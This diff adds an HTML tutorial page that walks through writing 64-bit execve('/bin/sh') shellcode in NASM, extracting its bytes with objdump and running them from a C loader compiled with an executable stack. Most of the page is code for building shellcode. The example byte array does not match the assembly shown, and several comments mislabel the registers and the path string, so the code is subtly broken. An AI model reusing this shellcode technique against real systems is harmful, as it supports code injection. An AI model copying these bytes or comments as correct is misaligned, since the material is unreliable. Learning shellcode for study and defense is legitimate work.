@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Creating and Testing 64-bit Shellcode in NASM, Compiling, and Converting to C</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        line-height: 1.6;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+    code {
+        background-color: #f0f0f0;
+        padding: 2px 5px;
+        border-radius: 3px;
+    }
+</style>
+</head>
+<body>
+
+<h1>Creating and Testing 64-bit Shellcode in NASM, Compiling, and Converting to C</h1>
+
+<a href="index.html">Check the 32 bit shellcode writing guide!</a>
+
+<h2>Step 1: Write Shellcode in NASM</h2>
+
+<p>Create a file named <code>shellcode.asm</code> with the following NASM code. This example shellcode executes <code>/bin/sh</code> using the <code>execve</code> system call:</p>
+
+<pre><code>section .text
+global _start
+
+_start:
+    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
+    xor     rax, rax        ; Clear rax register
+    push    rax             ; Null terminator for string
+    mov     rbx, 0x68732f6e69622f2f ; Push "//bin/sh" onto stack (reverse order due to little-endian)
+    push    rbx
+    mov     rdi, rsp        ; Move pointer to "/bin//sh" into rdi (1st argument)
+    push    rax             ; Null-terminator for argv array
+    mov     rdx, rsp        ; Move pointer to null-terminator into rdx (2nd argument)
+    push    rdi             ; Push pointer to "/bin//sh" (argv[0])
+    mov     rsi, rsp        ; Move pointer to argv array into rsi (3rd argument)
+    mov     rax, 0x3b       ; Execve syscall number (59)
+    syscall                 ; Call execve("/bin/sh", ["/bin/sh", NULL], NULL)
+</code></pre>
+
+<h2>Step 2: Compile Shellcode with NASM</h2>
+
+<p>Compile <code>shellcode.asm</code> using NASM:</p>
+
+<pre><code>nasm -f elf64 -o shellcode.o shellcode.asm
+</code></pre>
+
+<h2>Step 3: Extract Shellcode with objdump</h2>
+
+<p>Use <code>objdump</code> to extract the shellcode bytes from the compiled object file:</p>
+
+<pre><code>objdump -d shellcode.o
+</code></pre>
+
+<p>Locate the bytes corresponding to the instructions you wrote in <code>shellcode.asm</code>. For example, the <code>push</code> and <code>mov</code> instructions directly encode the bytes we need for the shellcode.</p>
+
+<h2>Step 4: Convert Shellcode to C Array</h2>
+
+<p>Manually extract the bytes from <code>objdump</code> output and convert them into a C array format. For example, if the extracted bytes are <code>"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05"</code>:</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05";
+
+int main() {
+    printf("Shellcode Length: %ld\n", strlen(shellcode));
+    (*(void (*)()) shellcode)();
+    return 0;
+}
+</code></pre>
+
+<h2>Step 5: Compile and Run C Program</h2>
+
+<p>Save the C code to a file, e.g., <code>shellcode.c</code>, and compile it:</p>
+
+<pre><code>gcc -o shellcode shellcode.c -z execstack
+</code></pre>
+
+<h2>Step 6: Execute Shellcode</h2>
+
+<p>Execute the compiled C program to ensure the shellcode works:</p>
+
+<pre><code>./shellcode
+</code></pre>
+
+<h2>Summary of Commands</h2>
+
+<p>Here's a summary of all the commands used:</p>
+
+<ol>
+    <li><strong>Write Shellcode in NASM:</strong> Create <code>shellcode.asm</code> with the assembly code.</li>
+    <li><strong>Compile Shellcode with NASM:</strong></li>
+    <pre><code>nasm -f elf64 -o shellcode.o shellcode.asm
+    </code></pre>
+    <li><strong>Extract Shellcode with objdump:</strong></li>
+    <pre><code>objdump -d shellcode.o
+    </code></pre>
+    <li><strong>Convert Shellcode to C Array:</strong> Manually extract the bytes from <code>objdump</code> output and convert them into a C array format.</li>
+    <li><strong>Compile and Run C Program:</strong></li>
+    <pre><code>gcc -o shellcode shellcode.c -z execstack
+    ./shellcode
+    </code></pre>
+</ol>
+
+<p>This sequence allows you to create, compile, extract, and utilize 64-bit shellcode in a controlled environment, which is useful for testing and understanding shellcode execution. Adjust paths and filenames as needed for your specific setup.</p>
+
+</body>
+</html>
